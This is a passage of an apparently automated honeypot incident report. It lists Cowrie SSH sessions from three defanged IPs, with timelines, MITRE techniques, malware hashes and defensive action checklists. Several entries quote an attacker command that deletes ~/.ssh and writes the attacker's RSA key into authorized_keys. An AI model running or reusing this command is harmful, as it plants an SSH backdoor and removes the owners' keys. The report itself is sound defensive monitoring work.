| `2026-04-18 09:27:50` | `cowrie.command.failed` |
| `2026-04-18 09:27:51` | `cowrie.log.closed` |
| `2026-04-18 09:27:51` | `cowrie.session.params` |
| `2026-04-18 09:27:51` | `cowrie.command.input` |
| `2026-04-18 09:27:51` | `cowrie.session.file_download` |
| `2026-04-18 09:27:51` | `cowrie.log.closed` |
| `2026-04-18 09:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ead72673283

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:27 |
| **Last Seen** | 2026-04-18 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:27:54` | `cowrie.session.connect` |
| `2026-04-18 09:27:54` | `cowrie.client.version` |
| `2026-04-18 09:27:54` | `cowrie.client.kex` |
| `2026-04-18 09:27:55` | `cowrie.login.success` |
| `2026-04-18 09:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c3eca4a7eaa

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:29 |
| **Last Seen** | 2026-04-18 09:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:29:28` | `cowrie.session.connect` |
| `2026-04-18 09:29:28` | `cowrie.client.version` |
| `2026-04-18 09:29:29` | `cowrie.client.kex` |
| `2026-04-18 09:29:30` | `cowrie.login.success` |
| `2026-04-18 09:29:30` | `cowrie.session.params` |
| `2026-04-18 09:29:30` | `cowrie.command.input` |
| `2026-04-18 09:29:30` | `cowrie.command.failed` |
| `2026-04-18 09:29:30` | `cowrie.log.closed` |
| `2026-04-18 09:29:31` | `cowrie.session.params` |
| `2026-04-18 09:29:31` | `cowrie.command.input` |
| `2026-04-18 09:29:31` | `cowrie.session.file_download` |
| `2026-04-18 09:29:31` | `cowrie.log.closed` |
| `2026-04-18 09:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a11ccab8b6

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:29 |
| **Last Seen** | 2026-04-18 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:29:34` | `cowrie.session.connect` |
| `2026-04-18 09:29:34` | `cowrie.client.version` |
| `2026-04-18 09:29:34` | `cowrie.client.kex` |
| `2026-04-18 09:29:35` | `cowrie.login.success` |
| `2026-04-18 09:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea38a2cc880a

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:29 |
| **Last Seen** | 2026-04-18 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:29:34` | `cowrie.session.connect` |
| `2026-04-18 09:29:34` | `cowrie.client.version` |
| `2026-04-18 09:29:35` | `cowrie.client.kex` |
| `2026-04-18 09:29:35` | `cowrie.login.success` |
| `2026-04-18 09:29:35` | `cowrie.session.params` |
| `2026-04-18 09:29:35` | `cowrie.command.input` |
| `2026-04-18 09:29:35` | `cowrie.command.failed` |
| `2026-04-18 09:29:35` | `cowrie.log.closed` |
| `2026-04-18 09:29:35` | `cowrie.session.params` |
| `2026-04-18 09:29:35` | `cowrie.command.input` |
| `2026-04-18 09:29:35` | `cowrie.session.file_download` |
| `2026-04-18 09:29:35` | `cowrie.log.closed` |
| `2026-04-18 09:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35433c9dc46b

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:29 |
| **Last Seen** | 2026-04-18 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:29:37` | `cowrie.session.connect` |
| `2026-04-18 09:29:37` | `cowrie.client.version` |
| `2026-04-18 09:29:37` | `cowrie.client.kex` |
| `2026-04-18 09:29:37` | `cowrie.login.success` |
| `2026-04-18 09:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72098cd1f4a

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:29 |
| **Last Seen** | 2026-04-18 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:29:40` | `cowrie.session.connect` |
| `2026-04-18 09:29:40` | `cowrie.client.version` |
| `2026-04-18 09:29:40` | `cowrie.client.kex` |
| `2026-04-18 09:29:40` | `cowrie.login.success` |
| `2026-04-18 09:29:41` | `cowrie.session.params` |
| `2026-04-18 09:29:41` | `cowrie.command.input` |
| `2026-04-18 09:29:41` | `cowrie.command.failed` |
| `2026-04-18 09:29:41` | `cowrie.log.closed` |
| `2026-04-18 09:29:41` | `cowrie.session.params` |
| `2026-04-18 09:29:41` | `cowrie.command.input` |
| `2026-04-18 09:29:41` | `cowrie.session.file_download` |
| `2026-04-18 09:29:41` | `cowrie.log.closed` |
| `2026-04-18 09:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cac13070a66

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:29 |
| **Last Seen** | 2026-04-18 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:29:43` | `cowrie.session.connect` |
| `2026-04-18 09:29:43` | `cowrie.client.version` |
| `2026-04-18 09:29:43` | `cowrie.client.kex` |
| `2026-04-18 09:29:43` | `cowrie.login.success` |
| `2026-04-18 09:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c8915c4929

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:31 |
| **Last Seen** | 2026-04-18 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:31:05` | `cowrie.session.connect` |
| `2026-04-18 09:31:05` | `cowrie.client.version` |
| `2026-04-18 09:31:05` | `cowrie.client.kex` |
| `2026-04-18 09:31:06` | `cowrie.login.success` |
| `2026-04-18 09:31:06` | `cowrie.session.params` |
| `2026-04-18 09:31:06` | `cowrie.command.input` |
| `2026-04-18 09:31:06` | `cowrie.command.failed` |
| `2026-04-18 09:31:07` | `cowrie.log.closed` |
| `2026-04-18 09:31:07` | `cowrie.session.params` |
| `2026-04-18 09:31:07` | `cowrie.command.input` |
| `2026-04-18 09:31:07` | `cowrie.session.file_download` |
| `2026-04-18 09:31:07` | `cowrie.log.closed` |
| `2026-04-18 09:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436e0babb5e6

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:31 |
| **Last Seen** | 2026-04-18 09:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:31:08` | `cowrie.session.connect` |
| `2026-04-18 09:31:08` | `cowrie.client.version` |
| `2026-04-18 09:31:08` | `cowrie.client.kex` |
| `2026-04-18 09:31:09` | `cowrie.login.success` |
| `2026-04-18 09:31:09` | `cowrie.session.params` |
| `2026-04-18 09:31:09` | `cowrie.command.input` |
| `2026-04-18 09:31:09` | `cowrie.command.failed` |
| `2026-04-18 09:31:09` | `cowrie.log.closed` |
| `2026-04-18 09:31:09` | `cowrie.session.params` |
| `2026-04-18 09:31:09` | `cowrie.command.input` |
| `2026-04-18 09:31:09` | `cowrie.session.file_download` |
| `2026-04-18 09:31:09` | `cowrie.log.closed` |
| `2026-04-18 09:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005119164fa8

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:31 |
| **Last Seen** | 2026-04-18 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:31:10` | `cowrie.session.connect` |
| `2026-04-18 09:31:10` | `cowrie.client.version` |
| `2026-04-18 09:31:10` | `cowrie.client.kex` |
| `2026-04-18 09:31:11` | `cowrie.login.success` |
| `2026-04-18 09:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4a38d0fe64

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:31 |
| **Last Seen** | 2026-04-18 09:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:31:11` | `cowrie.session.connect` |
| `2026-04-18 09:31:11` | `cowrie.client.version` |
| `2026-04-18 09:31:11` | `cowrie.client.kex` |
| `2026-04-18 09:31:11` | `cowrie.login.success` |
| `2026-04-18 09:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936ab1cc1e61

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:32 |
| **Last Seen** | 2026-04-18 09:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:32:16` | `cowrie.session.connect` |
| `2026-04-18 09:32:16` | `cowrie.client.version` |
| `2026-04-18 09:32:16` | `cowrie.client.kex` |
| `2026-04-18 09:32:16` | `cowrie.login.success` |
| `2026-04-18 09:32:17` | `cowrie.session.params` |
| `2026-04-18 09:32:17` | `cowrie.command.input` |
| `2026-04-18 09:32:17` | `cowrie.command.failed` |
| `2026-04-18 09:32:17` | `cowrie.log.closed` |
| `2026-04-18 09:32:17` | `cowrie.session.params` |
| `2026-04-18 09:32:17` | `cowrie.command.input` |
| `2026-04-18 09:32:17` | `cowrie.session.file_download` |
| `2026-04-18 09:32:17` | `cowrie.log.closed` |
| `2026-04-18 09:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5602144dfaad

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:32 |
| **Last Seen** | 2026-04-18 09:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:32:19` | `cowrie.session.connect` |
| `2026-04-18 09:32:19` | `cowrie.client.version` |
| `2026-04-18 09:32:19` | `cowrie.client.kex` |
| `2026-04-18 09:32:19` | `cowrie.login.success` |
| `2026-04-18 09:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0161692eb9

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:32 |
| **Last Seen** | 2026-04-18 09:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:32:35` | `cowrie.session.connect` |
| `2026-04-18 09:32:35` | `cowrie.client.version` |
| `2026-04-18 09:32:35` | `cowrie.client.kex` |
| `2026-04-18 09:32:35` | `cowrie.login.success` |
| `2026-04-18 09:32:35` | `cowrie.session.params` |
| `2026-04-18 09:32:35` | `cowrie.command.input` |
| `2026-04-18 09:32:35` | `cowrie.command.failed` |
| `2026-04-18 09:32:35` | `cowrie.log.closed` |
| `2026-04-18 09:32:35` | `cowrie.session.params` |
| `2026-04-18 09:32:35` | `cowrie.command.input` |
| `2026-04-18 09:32:36` | `cowrie.session.file_download` |
| `2026-04-18 09:32:36` | `cowrie.log.closed` |
| `2026-04-18 09:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb47d5f548c

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:32 |
| **Last Seen** | 2026-04-18 09:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:32:37` | `cowrie.session.connect` |
| `2026-04-18 09:32:37` | `cowrie.client.version` |
| `2026-04-18 09:32:37` | `cowrie.client.kex` |
| `2026-04-18 09:32:38` | `cowrie.login.success` |
| `2026-04-18 09:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-355e27dba942

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:32 |
| **Last Seen** | 2026-04-18 09:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:32:38` | `cowrie.session.connect` |
| `2026-04-18 09:32:38` | `cowrie.client.version` |
| `2026-04-18 09:32:38` | `cowrie.client.kex` |
| `2026-04-18 09:32:39` | `cowrie.login.success` |
| `2026-04-18 09:32:40` | `cowrie.session.params` |
| `2026-04-18 09:32:40` | `cowrie.command.input` |
| `2026-04-18 09:32:40` | `cowrie.command.failed` |
| `2026-04-18 09:32:40` | `cowrie.log.closed` |
| `2026-04-18 09:32:41` | `cowrie.session.params` |
| `2026-04-18 09:32:41` | `cowrie.command.input` |
| `2026-04-18 09:32:41` | `cowrie.session.file_download` |
| `2026-04-18 09:32:41` | `cowrie.log.closed` |
| `2026-04-18 09:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8acd0c0e6677

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:32 |
| **Last Seen** | 2026-04-18 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:32:44` | `cowrie.session.connect` |
| `2026-04-18 09:32:44` | `cowrie.client.version` |
| `2026-04-18 09:32:44` | `cowrie.client.kex` |
| `2026-04-18 09:32:45` | `cowrie.login.success` |
| `2026-04-18 09:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdce7ab81d85

